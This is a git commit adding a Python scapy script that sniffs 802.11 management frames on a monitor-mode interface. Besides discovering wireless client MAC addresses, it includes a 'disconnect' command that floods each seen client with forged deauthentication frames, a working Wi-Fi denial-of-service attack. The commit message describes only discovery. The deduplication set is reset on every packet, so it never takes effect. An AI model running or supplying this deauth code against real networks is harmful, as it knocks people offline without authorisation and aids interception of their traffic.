19bd21308ffd7ca9d8de155b78ca67f69b5edd3c
rhlobo <rhlobo+github@gmail.com>
2014-09-21 14:51:26 -0300

    Created wireless client discovery (mac address).

---
+++ wifi_discover_macs.py
@@ -0,0 +1,52 @@
+#!/usr/bin/env python
+
+
+'''
+This script is intended to find wireless clients.
+It can:
+- Discover MAC addresses
+
+You need to have your wireless card in monitor mode:
+
+    $ airmon-ng start wlan0
+'''
+
+import argh
+import functools
+from scapy.all import *
+
+
+def sniffmgmt(post_process, packet):
+    clients = set()
+
+    if packet.haslayer(Dot11):
+        if packet.type == 0:
+
+            if packet.addr2 not in clients:
+                mac_address = packet.addr2
+                clients.add(mac_address)
+                post_process(packet)
+
+
+def discover(interface='mon0'):
+    def _print_mac(packet):
+        print packet.addr2
+
+    fn = functools.partial(sniffmgmt, _print_mac)
+    sniff(iface=interface, prn=fn)
+
+
+def disconnect(interface='mon0'):
+    def _deauth_mac(packet):
+        sendp(RadioTap() / Dot11(type=0,
+                                 subtype=12,
+                                 addr1=packet.addr2,
+                                 addr2=packet.addr3,
+                                 addr3=packet.addr3) / Dot11Deauth())
+
+    fn = functools.partial(sniffmgmt, _deauth_mac)
+    sniff(iface=interface, prn=fn)
+
+
+if __name__ == '__main__':
+    argh.dispatch_commands([discover, disconnect])
